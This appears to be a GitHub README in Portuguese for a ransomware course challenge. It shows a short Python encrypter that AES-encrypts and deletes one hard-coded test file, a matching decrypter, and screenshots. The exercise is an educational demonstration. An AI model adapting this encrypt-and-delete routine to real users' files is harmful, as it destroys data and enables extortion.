# DevThallya-cibersecurity-desafio-ransomware

Projeto cibersegurança desafio ransoware

📌Encrypter:

import os
import pyaes

file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

📌Decrypter:

import os
import pyaes

file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

os.remove(file_name)

new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()


🖼 Prints do Projeto:
![image](https://github.com/user-attachments/assets/3c0949f8-86ef-4781-af09-edc455520bfc)
![image](https://github.com/user-attachments/assets/86262f0d-5a89-46e3-bbc0-f95c990de673)
![image](https://github.com/user-attachments/assets/6b2c13f5-32d2-4750-bbf8-c2c801755416)
![image](https://github.com/user-attachments/assets/8fd0a18f-1323-433a-bd2a-0153d7b7fa0e)
![image](https://github.com/user-attachments/assets/d7a113f2-e517-41d1-a341-39bf31371dd4)



